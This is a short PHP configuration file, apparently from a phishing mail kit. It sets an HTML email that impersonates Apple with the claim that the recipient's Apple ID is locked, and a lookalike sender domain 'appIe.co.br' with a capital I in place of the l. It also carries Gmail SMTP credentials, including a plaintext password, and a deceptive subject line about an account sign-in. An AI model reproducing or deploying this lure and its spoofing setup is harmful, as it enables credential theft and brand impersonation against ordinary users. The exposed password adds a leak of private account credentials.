<?php

//*****

$body = '<div align="center"><font face="courier new">Hello customer,</font><br /><br /><font face="courier new">Your Apple ID has been locked for security reasons.</font><br /><font face="courier new">Please check your activity.</font><br /><br /><br /><br /></div>'; // BODY

// ****

$smtphost = 'smtp.gmail.com'; //SMTP HOST
$username = 'protectionappleid@gmail.com'; //SMTP USERNAME
$password = 'Indons47'; //SMTP Password
$port = '587'; //SMTP PORT
$smtpsecure = 'tls';
$sentfrom = 'adminthomas@id.appIe.co.br'; // EMAIL SENDER FROM
$sendername = 'Hello From Apple'; // EMAIL SENDER NAME
$subject = '[Statement] Reminder: Someone has signed in and added a new email to your account, service'; // EMAIL SUBJECT
